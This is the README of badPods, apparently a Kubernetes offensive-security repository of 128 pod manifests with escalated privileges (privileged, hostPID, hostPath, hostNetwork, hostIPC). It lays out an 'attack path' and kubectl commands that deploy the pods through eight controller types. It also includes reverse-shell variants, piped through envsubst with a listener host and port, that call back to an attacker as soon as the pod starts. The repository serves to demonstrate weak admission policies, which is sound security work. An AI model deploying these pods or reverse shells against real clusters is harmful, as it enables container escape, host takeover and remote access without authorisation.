# badPods

A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing security sensitive pod specifications. 

## Background
Occasionally pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications using [PodSecurityPolicy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/), or third-party admission controllers like [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper). 

However, even though the controls exist to define and enforce policy, the real-world security implication of allowing each specific attribute is not always understood, and quite often, pod creation is not as locked down as it should be.

## Purpose
What if you can create a pod with just `hostNetwork`, just `hostPID`, just `hostIPC`, just `hostPath`, or just `privileged`? What can you do in each case? This repository aims to help you answer those questions by providing some easy to use manifests and actionable steps to achieve those goals. 

## Prerequisites
In order to be successful in this attack path, you'll need the following: 

1. Access to a cluster 
1. RBAC Permission to create one of the following resource types in at least one namespace: 
   * CronJob, DeamonSet, Deployment, Job, Pod, ReplicaSet, ReplicationController, StatefulSet
1. RBAC permission to exec into pods or a network policy that allows a reverse shell from a pod to reach you. 
1. A pod security policy (or other pod admission controller's logic) that llows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all

## The badPods line-up

Notes | readme | pod | revshell
-- | -- | -- | --
Everything allowed | [readme](manifests/everything-allowed/) | [manifest](manifests/everything-allowed/everything-allowed.yaml) | [manifest](manifests/everything-allowed/everything-allowed-revshell.yaml)
Privileged and hostPid | [readme](manifests/priv-and-hostpid/) | [manifest](manifests/priv-and-hostpid/pod-priv-and-hostpid.yaml) | [manifest](manifests/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml)
Privileged only | [readme](manifests/priv/) | [manifest](manifests/priv/pod-priv.yaml) | [manifest](manifests/priv/pod-priv-revshell.yaml)
hostPath only | [readme](manifests/hostpath/) | [manifest](manifests/hostpath/hostpath-exec.yaml) | [manifest](manifests/hostpath/hostpath-revshell.yaml)  
hostPid only | [readme](manifests/hostpid/) | [manifest](manifests/hostpid/hostpid.yaml) | [manifest](manifests/hostpid/hostpid-revshell.yaml)  
hostNetwork only | [readme](manifests/hostnetwork/) | [manifest](manifests/hostnetwork/hostnetwork-exec.yaml) | [manifest](manifests/hostnetwork/hostnetwork-revshell.yaml)
hostIPC only | [readme](manifests/hostipc/) | [manifest](manifests/hostipc/hostipc-exec.yaml) | [manifest](manifests/hostipc/hostipc-revshell.yaml)
Nothing allowed | [readme](manifests/nothing-allowed/) | [manifest](manifests/nothing-allowed/nothing-allowed.yaml) | [manifest](manifests/nothing-allowed/nothing-allowed-revshell.yaml)

# Impact - What's the worst that can happen?
Check out blog post here

# Organization
There are 128 manifests. 
* `8 types of badPods` X `8 types of resources` X `2 access methods - exec/reverse shell`
```bash
├── manifests
│   ├── everything-allowed
│   │   ├── cronjob
│   │   │   ├── everything-allowed-exec-cronjob.yaml
│   │   │   └── everything-allowed-revshell-cronjob.yaml
│   │   ├── deamonset
│   │   │   ├── everything-allowed-exec-deamonset.yaml
│   │   │   └── everything-allowed-revshell-deamonset.yaml
│   │   ├── deployment
│   │   │   ├── everything-allowed-exec-deployment.yaml
│   │   │   └── everything-allowed-revshell-deployment.yaml
│   │   ├── job
│   │   │   ├── everything-allowed-exec-job.yaml
│   │   │   └── everything-allowed-revshell-job.yaml
│   │   ├── pod
│   │   │   ├── everything-allowed-exec-pod.yaml
│   │   │   └── everything-allowed-revshell-pod.yaml
│   │   ├── replicaset
│   │   │   ├── everything-allowed-exec-replicaset.yaml
│   │   │   └── everything-allowed-revshell-replicaset.yaml
│   │   ├── replicationcontroller
│   │   │   ├── everything-allowed-exec-replicationcontroller.yaml
│   │   │   └── everything-allowed-revshell-replicationcontroller.yaml
│   │   └── statefulset
│   │       ├── everything-allowed-exec-statefulset.yaml
│   │       └── everything-allowed-revshell-statefulset.yaml
│   ├── hostipc
│   │   ├── cronjob
│   │   │   ├── hostipc-exec-cronjob.yaml
│   │   │   └── hostipc-revshell-cronjob.yaml
│   │   ├── deamonset
│   │   │   ├── hostipc-exec-deamonset.yaml
│   │   │   └── hostipc-revshell-deamonset.yaml
...omitted for brevity...
```

## "There are Eight ways to create a Pod"
As [Eviatar Gerzi (@g3rzi)](https://twitter.com/g3rzi) points out in the post [Eight Ways to Create a Pod
](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod), there are 8 different controllers that create a pod, or a set of pods.  You might be a situation where you are not authorized to create pods, but you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 

## Reverse shells
While common, it is not always the case that you can exec into pods that you can create. To help in those situations, a version of each manifest is included that will call back to your listener as soon as the pod is created. 

# Usage
Each resource in the `manifests` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  

### Clone the repo
```bash
git clone https://github.com/BishopFox/badPods
cd badPods
```

### Create all eight badPods (if the admission controller allows it)
```bash
kubectl apply -f ./manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl apply -f ./manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
kubectl apply -f ./manifests/priv/pod/priv-exec-pod.yaml
kubectl apply -f ./manifests/hostpath/pod/hostpath-exec-pod.yaml
kubectl apply -f ./manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl apply -f ./manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
kubectl apply -f ./manifests/hostipc/pod/hostipc-exec-pod.yaml
kubectl apply -f ./manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
```

### Create all eight revsere shell badPods
To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!

```bash
HOST="10.0.0.1" PORT="3111" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < ./manifests/priv-and-hostpid/pod/priv-and-hostpid-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < ./manifests/priv/pod/priv-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < ./manifests/hostpid/pod/hostpid-revshell-pod.yaml  | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/pod/hostnetwork-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshellv-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
```
### Create a cronjob of the hostNetwork Pod
```bash
$ kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
cronjob.batch/hostnetwork-exec-cronjob created
```
Find the created pod
```bash
$ kubectl get pods | grep cronjob
NAME                                        READY   STATUS    RESTARTS   AGE
hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
```
Exec into pod
```bash
$ kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
```

### Create a deployment 
```bash
$ kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
deployment.apps/priv-and-hostpid-exec-deployment created
```
Find the created pod
```bash
$ kubectl get pods | grep deployment
priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9   1/1     Running   0          56s
priv-and-hostpid-exec-deployment-65dbfbf947-tghqh   1/1     Running   0          56s
```
Exec into pod
```bash
$ kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
```

# Contributing
Have you run into a situation where there was a restritive policy, but you were still able to gain elevated access with only a subset of privileges or capabilites? If so, please consider sharing the yaml and the privesc steps, and we'll add it as a new badPod type. 

# Acknowledgements 
Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), [Mark Manning](https://twitter.com/antitree), and [Eviatar Gerzi](https://twitter.com/g3rzi) for publicly sharing so much knowledge about Kubernetes offensive security. 
